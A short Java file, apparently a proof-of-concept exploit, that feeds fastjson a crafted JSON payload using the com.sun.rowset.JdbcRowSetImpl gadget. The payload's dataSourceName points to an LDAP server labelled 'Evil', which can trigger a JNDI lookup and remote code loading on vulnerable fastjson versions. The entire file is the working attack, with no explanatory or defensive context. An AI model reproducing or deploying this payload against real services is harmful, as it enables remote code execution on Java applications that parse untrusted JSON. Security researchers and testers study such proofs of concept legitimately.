package org.example;

import com.alibaba.fastjson.JSON;

public class JNDIjdbcRowSetImpl {
    public static void main(String[] args) {
        String json = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Evil\",\"autoCommit\":true}";
        JSON.parseObject(json);
    }
}
